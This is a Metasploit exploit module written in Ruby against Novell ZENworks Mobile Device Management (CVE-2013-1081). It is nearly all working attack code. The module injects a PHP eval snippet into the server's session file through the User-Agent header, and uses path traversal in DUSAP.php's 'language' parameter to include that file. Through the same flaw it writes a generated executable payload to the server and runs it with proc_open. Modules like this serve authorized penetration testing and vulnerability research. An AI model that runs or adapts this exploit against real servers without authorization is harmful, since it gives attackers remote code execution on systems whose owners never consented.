# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  def initialize
    super(
      &#039;Name&#039;           => &#039;Novell Zenworks Mobile Device Managment Local File Inclusion Vulnerability&#039;,
      &#039;Description&#039;    => %q{
        This module attempts to gain remote code execution on a server running
        Novell Zenworks Mobile Device Management.
      },
      &#039;Author&#039;         =>
        [
          &#039;steponequit&#039;,
          &#039;Andrea Micalizzi (aka rgod)&#039; #zdi report
        ],
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;Novell Zenworks Mobile Device Management on Windows&#039;, {} ],
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2013-1081&#039;],
          [&#039;OSVDB&#039;, &#039;91119&#039;],
          [&#039;URL&#039;, &#039;http://www.novell.com/support/kb/doc.php?id=7011895&#039;]
        ],
      &#039;DisclosureDate&#039; => "Mar 13 2013",
      &#039;License&#039;        => MSF_LICENSE
    )

    register_options([
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;Path to the Novell Zenworks MDM install&#039;, &#039;/&#039;]),
      OptInt.new(&#039;RPORT&#039;, [true, "Default remote port", 80])
    ], self.class)

    register_advanced_options([
      OptBool.new(&#039;SSL&#039;, [true, "Negotiate SSL connection", false])
    ], self.class)
  end

  def peer
    "#{rhost}:#{rport}"
  end

  def get_version
    version = nil

    res = send_request_raw({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => target_uri.path
    })

    if (res and res.code == 200 and res.body.to_s.match(/ZENworks Mobile Management User Self-Administration Portal/) != nil)
      version = res.body.to_s.match(/<p id="version">Version (.*)<\/p>/)[1]
    end

    return version
  end

  def check
    v = get_version
    print_status("#{peer} - Detected version: #{v || &#039;Unknown&#039;}")

    if v.nil?
      return Exploit::CheckCode::Unknown
    elsif v =~ /^2\.6\.[01]/ or v =~ /^2\.7\.0/
      # Conditions based on OSVDB info
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe
  end

  def setup_session()
    sess = Rex::Text.rand_text_alpha(8)
    cmd = Rex::Text.rand_text_alpha(8)
    res = send_request_cgi({
      &#039;agent&#039; => "<?php echo(eval($_GET[&#039;#{cmd}&#039;])); ?>",
      &#039;method&#039; => "HEAD",
      &#039;uri&#039; => normalize_uri("#{target_uri.path}/download.php"),
      &#039;headers&#039; => {"Cookie" => "PHPSESSID=#{sess}"},
    })
    return sess,cmd
  end

  def upload_shell(session_id,cmd_var)
    fname   = Rex::Text.rand_text_alpha(8)
    payload = generate_payload_exe
    cmd     = "$wdir=getcwd().&#039;\\\\..\\\\..\\\\php\\\\temp\\\\&#039;;"
    cmd    << "file_put_contents($wdir.&#039;#{fname}.exe&#039;,"
    cmd    << "base64_decode(file_get_contents(&#039;php://input&#039;)));"

    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "DUSAP.php"),
      &#039;data&#039;     => Rex::Text.encode_base64(payload),
      &#039;vars_get&#039; => {
        &#039;language&#039; => "res/languages/../../../../php/temp/sess_#{session_id}",
        cmd_var    => cmd
      }
    })
    return fname
  end

  def exec_shell(session_id,cmd_var,fname)
    cmd  = "$wdir=getcwd().&#039;\\\\..\\\\..\\\\php\\\\temp\\\\&#039;;"
    cmd << "$cmd=$wdir.&#039;#{fname}&#039;;"
    cmd << "$output=array();"
    cmd << "$handle=proc_open($cmd,array(1=>array(&#039;pipe&#039;,&#039;w&#039;)),"
    cmd << "$pipes,null,null,array(&#039;bypass_shell&#039;=>true));"
    cmd << "if (is_resource($handle)){fclose($pipes[1]);proc_close($handle);}"

    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "DUSAP.php"),
      &#039;data&#039;     => Rex::Text.encode_base64(payload),
      &#039;vars_get&#039; => {
        &#039;language&#039; => "res/languages/../../../../php/temp/sess_#{session_id}",
        cmd_var    => cmd
      }
    })
  end


  def exploit()
    begin
      print_status("#{peer} - Checking application version...")
      v = get_version
      if v.nil?
        print_error("#{peer} - Unable to detect version, abort!")
        return
      end

      print_good("#{peer} - Found Version #{v}")
      print_status("#{peer} - Setting up poisoned session")
      session_id,cmd = setup_session()
      print_status("#{peer} - Uploading payload")
      fname = upload_shell(session_id,cmd)
      print_status("#{peer} - Executing payload")
      exec_shell(session_id,cmd,fname)

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue ::Timeout::Error, ::Errno::EPIPE
    rescue ::OpenSSL::SSL::SSLError => e
      return if(e.to_s.match(/^SSL_connect /) ) # strange errors / exception if SSL connection aborted
    end
  end

end

